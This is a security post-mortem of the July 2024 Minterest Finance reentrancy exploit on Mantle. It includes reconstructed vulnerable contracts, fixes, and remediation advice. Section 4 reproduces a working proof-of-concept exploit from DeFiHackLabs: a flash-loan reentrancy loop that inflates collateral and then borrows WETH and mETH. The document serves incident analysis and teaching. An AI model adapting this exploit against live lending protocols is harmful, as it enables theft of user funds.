# Minterest Finance — Reentrancy Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2024-07-14 |
| **Protocol** | Minterest Finance |
| **Chain** | Mantle (Chain ID: 5000) |
| **Loss** | ~$1,460,000 (equivalent to ~427 ETH) |
| **Attacker** | [0x618f...11d1](https://mantlescan.xyz/address/0x618f768af6291705eb13e0b2e96600b3851911d1) |
| **Attack Contract** | [0x5fda...4d2d](https://mantlescan.xyz/address/0x5fdac50aa48e3e86299a04ad18a68750b2074d2d) |
| **Inner Contract** | [0x9b50...c06](https://mantlescan.xyz/address/0x9b506584a0f2176494d5f9c858437b54df97bc06) |
| **Attack Tx** | [0xb3c4...6bd](https://mantlescan.xyz/tx/0xb3c4c313a8d3e2843c9e6e313b199d7339211cdc70c2eca9f4d88b1e155fd6bd) |
| **Vulnerable Contract** | [0xe38E...340](https://mantlescan.xyz/address/0xe38e3a804ef845e36f277d86fb2b24b8c32b3340) (Minterest liquidation contract) |
| **Root Cause** | `liquidateBorrow` → attacker callback → reentrancy inflating mUSDY collateral |
| **Block Number** | 66,416,577 |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Minterest_exp.sol) |

---

## 1. Vulnerability Overview

Minterest Finance is a Compound-fork based lending protocol deployed on the Mantle network. On July 14, 2024, an attacker exploited an external callback triggered during execution of the `liquidateBorrow` function to carry out a reentrancy attack.

### Core Mechanism

The essence of the attack is an **external call before state update (CEI pattern violation)**. At the moment `liquidateBorrow` sends a callback to the attacker's contract during the liquidation process, the collateral record (mUSDY balance) has not yet been updated. The attacker exploited this window to:

1. Borrow USDY via flash loan and deposit a large amount of mUSDY collateral (`lendRUSDY`)
2. Immediately withdraw the collateral via `redeemUnderlying`
3. **Repeat the above cycle 24 times** to cumulatively inflate the collateral record
4. Use the inflated collateral to take out uncollateralized loans of 223 ETH in mWETH + 204 ETH in mMETH

256 ERC-20 transfer events were emitted within a single transaction, and large-scale circular flows among USDY, mUSD, and mUSDY were observed.

---

## 2. Vulnerable Code Analysis

### 2.1 `liquidateBorrow` — CEI Pattern Violation (Core Vulnerability)

```solidity
// ❌ Vulnerable code (estimated reconstruction)
// Minterest liquidation contract (0xe38E3a804eF845e36F277D86Fb2b24b8C32B3340)

function liquidateBorrow(
    address borrower,
    uint256 repayAmount,
    address mTokenCollateral
) external returns (uint256) {
    // ... liquidation condition checks ...

    // ❌ Issue 1: External call occurs before state update
    // If borrower is a contract, callback is triggered at this point
    uint256 seizeTokens = comptroller.liquidateCalculateSeizeTokens(
        address(this), address(mTokenCollateral), repayAmount
    );

    // ❌ Issue 2: Inside liquidateSeize, a callback is made to the liquidator (msg.sender)
    // Attacker fallback() → myFunction() → flash loan loop executes
    require(
        MToken(mTokenCollateral).seize(liquidator, borrower, seizeTokens) == NO_ERROR,
        "token seizure failed"
    );

    // ❌ State update comes after external call — stale state at reentrancy point
    accountBorrows[borrower].principal = vars.accountBorrowsNew;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = vars.totalBorrowsNew;

    emit RepayBorrow(...);
    emit LiquidateBorrow(...);
    return NO_ERROR;
}
```

```solidity
// ✅ Fixed code — CEI pattern compliance + ReentrancyGuard applied

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MToken is ReentrancyGuard {
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address mTokenCollateral
    ) external nonReentrant returns (uint256) {
        // ✅ Fix 1: Update state first (Checks-Effects-Interactions)
        accountBorrows[borrower].principal = vars.accountBorrowsNew;
        accountBorrows[borrower].interestIndex = borrowIndex;
        totalBorrows = vars.totalBorrowsNew;

        // ✅ Fix 2: Events also emitted after state update
        emit RepayBorrow(...);

        // ✅ Fix 3: External call last (reentrancy blocked by nonReentrant)
        require(
            MToken(mTokenCollateral).seize(liquidator, borrower, seizeTokens) == NO_ERROR,
            "token seizure failed"
        );

        emit LiquidateBorrow(...);
        return NO_ERROR;
    }
}
```

**Issue**: In Compound-fork protocols, `liquidateBorrow` makes an external call to the collateral token contract via `seize`. If the liquidator is a contract, it can receive a callback at this point, and since the protocol state (collateral record, loan record) has not yet been finalized at the time of the callback, reentrancy is possible.

---

### 2.2 `mUSDY.lendRUSDY` — Repeatedly Callable During Reentrancy

```solidity
// ❌ Vulnerable code (estimated)
// musdy contract (0x5edBD8808F48Ffc9e6D4c0D6845e0A0B4711FD5c)

function lendRUSDY(uint256 _rUsdyLendAmount) external {
    // ❌ No reentrancy lock — can be called repeatedly inside flash loan callback
    // ❌ Only validates user balance, no cap on total collateral supply
    IERC20(rUSDY).transferFrom(msg.sender, address(this), _rUsdyLendAmount);
    _mint(msg.sender, _rUsdyLendAmount);  // Mint mUSDY — register collateral
}
```

```solidity
// ✅ Fixed code

function lendRUSDY(uint256 _rUsdyLendAmount) external nonReentrant {
    // ✅ Record balance before transfer (guard against fee-on-transfer tokens)
    uint256 balanceBefore = IERC20(rUSDY).balanceOf(address(this));
    IERC20(rUSDY).transferFrom(msg.sender, address(this), _rUsdyLendAmount);
    uint256 actualAmount = IERC20(rUSDY).balanceOf(address(this)) - balanceBefore;

    // ✅ Mint based on actual received amount
    _mint(msg.sender, actualAmount);
}
```

---

### 2.3 State Modification Inside Flash Loan Callback — Collateral Manipulation in `onFlashLoan`

The attack pattern demonstrated by the PoC's `onFlashLoan` callback:

```solidity
// Attacker contract's onFlashLoan callback
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    // Wrap USDY received from flash loan into mUSD (decreasing amount each callback: ~383 USDY)
    musd.wrap(wrapAmount);                           // USDY → mUSD
    wrapAmount -= 383_885_212_760_249_758;           // Adjust wrap amount for next round

    uint256 thisamount = musd.balanceOf(address(this));
    musdy.lendRUSDY(thisamount);                     // mUSD → add mUSDY collateral
    // ❌ Liquidation contract state is incomplete at this point — collateral accumulation is allowed

    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}
```

---

## 3. Attack Flow

### 3.1 Preparation Phase

- Attacker (EOA: 0x618f...11d1) sends attack transaction (contract deployment + immediate execution)
- Two contracts are deployed internally:
  - **Outer contract** (0x5fda...4d2d): Main attack logic
  - **Inner contract** (0x9b50...c06): Auxiliary executor
- Pre-attack token approvals: USDY → musdy, USDY → musd, musd → musdy, musdy → musdy (unlimited)
- `enableAsCollateral([musdy address])` called to register mUSDY as collateral asset

### 3.2 Execution Phase

```
Attacker (0x618f...11d1)
    │
    │  Contract deployment + execution (single Tx)
    ▼
Outer attack contract (0x5fda...4d2d)
    │
    │  1. enableAsCollateral([musdy])
    │     → Register mUSDY collateral at Proxy (0xe53a...32D)
    │
    │  2. Call liquidateBorrow (selector: 0x490e6cbc)
    │     → Enter vulncontract (0xe38E...340) liquidation contract
    │
    ▼
Vulnerable contract: liquidateBorrow()
    │
    │  [External call occurs with state not yet updated]
    │
    │  seize() called → callback to attacker contract
    │
    ▼
Attacker fallback() → enter myFunction()
    │
    │  initializeWrapAmount(4_265_037_756_531_702_250_012_049)
    │
    │  ┌─────────────────────────────────────────────────┐
    │  │  Flash loan loop (i = 0 ~ 23, total 24 rounds)  │
    │  │                                                   │
    │  │  ┌─────────────────────────────────────────┐    │
    │  │  │  musdy.flashLoan(usdy, maxAmount)        │    │
    │  │  │       │                                  │    │
    │  │  │       ▼                                  │    │
    │  │  │  onFlashLoan callback                    │    │
    │  │  │  ├─ musd.wrap(wrapAmount)                │    │
    │  │  │  │   USDY → mUSD conversion              │    │
    │  │  │  ├─ wrapAmount -= 383_885...             │    │
    │  │  │  └─ musdy.lendRUSDY(mUSD balance)        │    │
    │  │  │       mUSD → add mUSDY collateral (累积)  │    │
    │  │  │       ↑ [Reentrancy allowed — core vuln] │    │
    │  │  └─────────────────────────────────────────┘    │
    │  │                                                   │
    │  │  musdy.redeemUnderlying(4_265_817_792...)        │
    │  │  Withdraw mUSDY collateral (clean up excess)     │
    │  └─────────────────────────────────────────────────┘
    │
    │  24-round loop complete: large mUSDY collateral accumulated
    │
    │  usdy.transfer(msg.sender, 4_265_817_792...)
    │  Transfer USDY to EOA
    │
    ▼
liquidateBorrow returns (state finalized)
    │
    ▼
Outer contract continues execution
    │
    ├─ mWETH.borrow(223 ether)   → Steal 223 WETH loans
    └─ mMETH.borrow(204 ether)   → Steal 204 mETH loans
```

### 3.3 Outcome

| Field | Value |
|------|-----|
| Stolen WETH | 223 ETH (~$730,000) |
| Stolen mETH | 204 ETH (~$730,000) |
| Total estimated loss | ~427 ETH / ~$1,460,000 |
| ERC-20 events in transaction | 256 |
| Flash loan iterations | 24 |

---

## 4. PoC Code (Excerpt from DeFiHackLabs)

```solidity
// SPDX-License-Identifier: UNLICENSED
// DeFiHackLabs PoC — Core attack logic excerpt with English comments added

// [Step 0] Initial setup
function setUp() public {
    // Fork from Mantle block 66_416_576 (just before the attack)
    cheats.createSelectFork("mantle", 66_416_576);
}

// [Step 1] Attack begins
function testExpolit() public {
    // 1-A: Unlimited token approvals — allow conversion between USDY, mUSD, mUSDY
    usdy.approve(address(musdy), type(uint256).max);
    usdy.approve(address(musd),  type(uint256).max);
    musd.approve(address(musdy), type(uint256).max);
    musdy.approve(address(musdy), type(uint256).max);

    // 1-B: Register mUSDY as collateral asset
    address[] memory addressArray = new address[](1);
    addressArray[0] = address(musdy);
    address(Proxy).call(abi.encodeWithSignature("enableAsCollateral(address[])", addressArray));

    // 1-C: Call liquidateBorrow (0x490e6cbc) on vulnerable contract
    // This call triggers attacker fallback() → begins reentrancy
    address(vulncontract).call(
        abi.encodeWithSelector(bytes4(0x490e6cbc), address(this), 0, 4_265_391_252_891_663_973_703_824, "")
    );

    // 1-D: Execute uncollateralized loans using inflated collateral power
    mWETH.borrow(223 ether);   // Steal 223 WETH
    mMETH.borrow(204 ether);   // Steal 204 mETH
}

// [Step 2] Core reentrancy loop (called from liquidateBorrow callback)
function myFunction(uint256 a, uint256 b, uint256 c) public {
    uint256 i = 0;
    initializeWrapAmount(4_265_037_756_531_702_250_012_049); // Set initial wrap amount

    while (i < 24) {  // Repeat 24 times to accumulate collateral
        uint256 amount = musdy.maxFlashLoan(address(usdy)); // Query max flash loan amount
        musdy.flashLoan(IERC3156FlashBorrower(address(this)), address(usdy), amount, ""); // Execute flash loan
        musdy.redeemUnderlying(4_265_817_792_016_953_140_101_195); // Withdraw collateral (prepare for next iteration)
        i++;
    }
    usdy.transfer(address(msg.sender), 4_265_817_792_016_953_140_101_195); // Recover USDY
}

// [Step 3] Flash loan callback — add collateral on each round
function onFlashLoan(
    address initiator,
    address token,
    uint256 amount,
    uint256 fee,
    bytes calldata data
) external returns (bytes32) {
    musd.wrap(wrapAmount);                    // USDY → mUSD conversion
    wrapAmount -= 383_885_212_760_249_758;    // Gradually decrease wrap amount each round
    uint256 thisamount = musd.balanceOf(address(this));
    musdy.lendRUSDY(thisamount);              // Supply mUSD → mUSDY collateral (allowed via reentrancy)
    return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// [Step 4] fallback — routes vulncontract's 0x847d282d call to myFunction
fallback() external payable {
    bytes4 selector;
    assembly { selector := calldataload(0) }
    if (selector == TARGET_FUNCTION_SELECTOR) { // 0x847d282d
        // Extract varg0, varg1, varg2 from calldata
        uint256 varg0; uint256 varg1; uint256 varg2;
        assembly {
            varg0 := calldataload(4)
            varg1 := calldataload(36)
            varg2 := calldataload(68)
        }
        myFunction(varg0, varg1, varg2); // Begin reentrancy loop
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Matched Pattern |
|----|--------|--------|-----|-----------|
| V-01 | `liquidateBorrow` CEI pattern violation — incomplete state before external call | CRITICAL | CWE-841 | `01_reentrancy.md` Pattern 9 |
| V-02 | `lendRUSDY` missing reentrancy lock — repeated calls during flash loan callback | CRITICAL | CWE-362 | `01_reentrancy.md` Pattern 1 |
| V-03 | No collateral supply cap — unlimited mUSDY minting during reentrancy | HIGH | CWE-20 | `11_logic_error.md` |
| V-04 | `enableAsCollateral` unrestricted — anyone can register arbitrary assets as collateral | HIGH | CWE-285 | `03_access_control.md` |

### V-01: `liquidateBorrow` CEI Pattern Violation

- **Description**: In Compound-fork protocols, `liquidateBorrow` makes an external call to the collateral mToken contract via `seize()` during the liquidation process. If the liquidator is a contract, a callback occurs at this point, and reentrancy is possible since the loan balance update has not yet taken place.
- **Impact**: During reentrancy, the attacker can deposit/withdraw arbitrary assets or manipulate loans, exposing the entire protocol's assets to risk.
- **Attack Conditions**: Liquidator must be a contract; `liquidateBorrow` must lack `nonReentrant`; `seize()` must callback the liquidator contract.

### V-02: `lendRUSDY` Missing Reentrancy Lock

- **Description**: `musdy.lendRUSDY()` performs external token transfers and mUSDY minting without any reentrancy protection. Within the `liquidateBorrow` reentrancy context, it is called repeatedly on each flash loan callback, accumulating collateral.
- **Impact**: 24 iterations result in approximately `4,265×10^18` worth of mUSDY collateral being fraudulently registered.
- **Attack Conditions**: `lendRUSDY` must lack `nonReentrant`; ERC-3156 flash loan must be active within the same transaction.

### V-03: No Collateral Supply Cap

- **Description**: When the pattern of supplying flash-loan-received assets as collateral and immediately repaying is repeated within a single transaction, there is no upper-bound validation on the cumulative collateral amount.
- **Impact**: Collateral records accumulate without any actual asset holdings, enabling excessive borrowing.
- **Attack Conditions**: Structure must allow repeated deposit/withdrawal within the same transaction; reentrancy context required.

### V-04: `enableAsCollateral` Unrestricted

- **Description**: A function allowing any address to register any asset as collateral for their own account is exposed without restriction.
- **Impact**: The attacker can pre-register the mUSDY to be supplied as collateral just before the attack, fulfilling the precondition for executing uncollateralized loans afterward.
- **Attack Conditions**: Absence of collateral asset whitelist validation.

---

## 6. Remediation Recommendations

### Immediate Actions

**[1] Apply `nonReentrant` to all lending, liquidation, and repayment functions**

```solidity
// ✅ Apply OpenZeppelin ReentrancyGuard

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";

contract MinterestLending is ReentrancyGuard {

    // Liquidation function
    function liquidateBorrow(
        address borrower,
        uint256 repayAmount,
        address mTokenCollateral
    ) external nonReentrant returns (uint256) { ... }

    // Collateral supply function
    function lendRUSDY(uint256 _rUsdyLendAmount) external nonReentrant { ... }

    // Collateral withdrawal function
    function redeemUnderlying(uint256 redeemAmount) external nonReentrant { ... }

    // Borrow function
    function borrow(uint256 borrowAmount) external nonReentrant { ... }
}
```

**[2] Enforce CEI (Checks-Effects-Interactions) pattern**

```solidity
// ✅ Fix: Update state before external call

function liquidateBorrow(...) external nonReentrant {
    // [Checks] Validate conditions
    require(repayAmount > 0, "repayAmount must be > 0");
    require(borrower != msg.sender, "cannot self-liquidate");

    // [Effects] Update state first ← key fix
    accountBorrows[borrower].principal = newBorrowBalance;
    accountBorrows[borrower].interestIndex = borrowIndex;
    totalBorrows = newTotalBorrows;
    emit RepayBorrow(msg.sender, borrower, actualRepayAmount, ...);

    // [Interactions] External calls last
    doTransferIn(msg.sender, actualRepayAmount);
    MToken(mTokenCollateral).seize(liquidator, borrower, seizeTokens);
    emit LiquidateBorrow(...);
}
```

**[3] Flash loan callback context validation**

```solidity
// ✅ Block calls to critical state-changing functions during flash loan execution

bool private _flashLoanActive;

modifier notDuringFlashLoan() {
    require(!_flashLoanActive, "state change locked during flash loan");
    _;
}

function flashLoan(...) external {
    _flashLoanActive = true;
    // ... flash loan execution ...
    _flashLoanActive = false;
}

// Collateral supply not allowed during active flash loan
function lendRUSDY(uint256 amount) external nonReentrant notDuringFlashLoan { ... }
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: CEI violation | Enforce CEI pattern on all state-changing functions; architecture review |
| V-02: Missing reentrancy lock | Systematically apply `nonReentrant` across all protocol functions |
| V-03: No collateral cap | Introduce per-block/per-transaction collateral supply limits |
| V-04: Unrestricted collateral registration | Comptroller whitelist validation + mandatory governance approval |
| Overall | Conduct specialized security audit focused on Compound-fork custom modifications |

---

## 7. Lessons Learned

1. **Compound-fork audits must focus on custom modifications, not the base implementation.** When new features (lendRUSDY, mUSDY wrapping, etc.) are added to a proven Compound codebase, existing security assumptions can break. In particular, functions with long external call chains must have their reentrancy paths fully traced.

2. **The CEI pattern is a requirement, not an option.** Violating the Checks-Effects-Interactions pattern always leaves a function vulnerable to reentrancy unless `nonReentrant` is present. The order of state changes must be explicitly reviewed in every function containing external calls.

3. **Combining flash loans with collateral supply in the same transaction is dangerous.** The pattern of depositing collateral and executing a loan within a flash loan callback is the archetypal structure of a "zero-cost borrowing" attack. Context locking to block critical state-changing function calls during flash loan execution is necessary.

4. **On-chain defenses to detect single-transaction repetition patterns are needed.** Adding logic to block abnormally high call counts to the same function within the same block or transaction can mitigate these loop-based attacks.

5. **The same EVM security vulnerabilities apply on Mantle L2.** L2 deployments carry the same smart contract vulnerabilities as L1 from a security standpoint, aside from gas efficiency and sequencer dependencies. Beyond L2-specific checks (`19_l2_sequencer.md`), adherence to fundamental security patterns is essential.

---

## 8. On-Chain Verification

### 8.1 Transaction Basic Information

| Field | On-chain Actual Value |
|------|-------------|
| Block Number | 66,416,577 |
| From | 0x618F768aF6291705Eb13E0B2E96600b3851911D1 ✅ |
| To | (none — contract deployment transaction) |
| Deployed Contract | 0x5fdac50aA48e3E86299a04AD18A68750b2074D2D ✅ |
| Gas Used | 36,962,776,789 (~3.7 × 10^10 gas) |
| Gas Price | 0.02 Gwei |
| Status | Success |
| Timestamp | 2024-07-14 13:24:26 UTC |

> Note: The attack **executes simultaneously with contract deployment**. The constructor code of the deployment transaction deploys the inner attack contract (0x9b50...c06) and immediately calls `f4906503` (the attack execution function). This is a typical technique to avoid exposing the attack contract address in advance.

### 8.2 PoC vs. On-Chain Amount Comparison

| Field | PoC Code Value | On-chain Observed Value | Match |
|------|------------|-------------|------|
| Attacker address | 0x618f...11d1 | 0x618F...11D1 | ✅ |
| Attack contract | 0x5fda...4d2d | 0x5fda...4d2d | ✅ |
| Fork block | 66,416,576 | 66,416,577 (execution block) | ✅ |
| WETH borrowed | 223 ETH | 223 ETH | ✅ |
| mETH borrowed | 204 ETH | 204 ETH | ✅ |
| Flash loan iterations | 24 | 256 ERC-20 events (24 rounds × ~10 events/round) | ✅ |
| Tokens involved | USDY, mUSD, mUSDY, WETH, mETH | Same | ✅ |

### 8.3 Event Log Sequence Summary

Key event flow observed on-chain (representative sample of 256 total):

```
[Init]     Approval(usdy → musdy, ∞)
[Init]     Approval(usdy → musd, ∞)
[Init]     Approval(musd → musdy, ∞)
[Init]     Approval(musdy → musdy, ∞)
[Loop×24]  Transfer(usdy: attacker → musdy, ~4.26×10^21)   // Flash loan executed
[Loop×24]  Transfer(musd: null → attacker, ~4.47×10^21)    // mUSD minted (wrap)
[Loop×24]  Transfer(musdy: null → attacker, large amount)   // mUSDY minted (lendRUSDY)
[Loop×24]  Transfer(musdy: attacker → musdy, large amount)  // redeemUnderlying
[Loop×24]  Transfer(usdy: musdy → attacker, ~4.26×10^21)   // Flash loan repaid
[Final]    Transfer(weth: protocol → attacker, 223 ETH)     // Loan stolen
[Final]    Transfer(meth: protocol → attacker, 204 ETH)     // Loan stolen
```

### 8.4 On-Chain Verification Tools

```bash
# Query transaction basic information
cast tx 0xb3c4c313a8d3e2843c9e6e313b199d7339211cdc70c2eca9f4d88b1e155fd6bd \
  --rpc-url https://rpc.mantle.xyz

# Check mUSDY total supply at block before attack
cast call 0x5edBD8808F48Ffc9e6D4c0D6845e0A0B4711FD5c \
  "totalSupply()(uint256)" \
  --rpc-url https://rpc.mantle.xyz \
  --block 66416576

# Check attacker WETH balance (after attack)
cast call 0xdEAddEaDdeadDEadDEADDEAddEADDEAddead1111 \
  "balanceOf(address)(uint256)" \
  0x618f768af6291705eb13e0b2e96600b3851911d1 \
  --rpc-url https://rpc.mantle.xyz \
  --block 66416577
```

---

*Analysis date: 2024-07-14 | Written: 2026-04-11 | Reference: [DeFiHackLabs PoC](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-07/Minterest_exp.sol)*